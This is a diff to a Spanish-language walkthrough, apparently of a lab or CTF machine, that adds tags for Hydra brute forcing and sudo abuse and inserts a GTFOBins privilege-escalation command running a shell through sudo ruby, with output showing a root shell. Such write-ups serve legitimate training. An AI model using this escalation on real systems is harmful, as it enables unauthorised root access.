@@ -1,4 +1,4 @@
-#tag
+#hydra #password-brute-force #gtfobins #abusing-sudo #ruby
 
 ![](../../../Images/Pasted%20image%2020241008071813.png)
 # Enumeración
@@ -161,5 +161,10 @@ Si investigamos en la página web de [GTFOBINS](https://gtfobins.github.io/) vem
 ![](../../../Images/Pasted%20image%2020241008172202.png)
 
 ```
-
+$ sudo ruby -e 'exec "/bin/sh"'
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+#
 ```
